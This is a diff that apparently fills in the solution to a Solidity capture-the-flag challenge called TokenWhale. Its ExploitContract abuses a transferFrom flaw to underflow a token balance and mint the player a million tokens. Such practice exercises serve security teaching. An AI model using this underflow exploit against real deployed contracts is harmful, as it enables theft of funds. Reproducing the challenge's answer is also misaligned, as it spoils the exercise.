@@ -21,7 +21,7 @@ contract TokenWhale {
     }
 
     function isComplete() public view returns (bool) {
-        return balanceOf[player] >= 1000000;
+        return balanceOf[player] >= 1_000_000;
     }
 
     function _transfer(address to, uint256 value) internal {
@@ -64,10 +64,16 @@ contract TokenWhale {
 // Write your exploit contract below
 contract ExploitContract {
     TokenWhale public tokenWhale;
+    address player;
 
     constructor(TokenWhale _tokenWhale) {
         tokenWhale = _tokenWhale;
+        player = msg.sender;
     }
 
     // write your exploit functions below
+    function exploit() public {
+        tokenWhale.transferFrom(player, player, 1000);
+        tokenWhale.transfer(player, 1_000_000);
+    }
 }
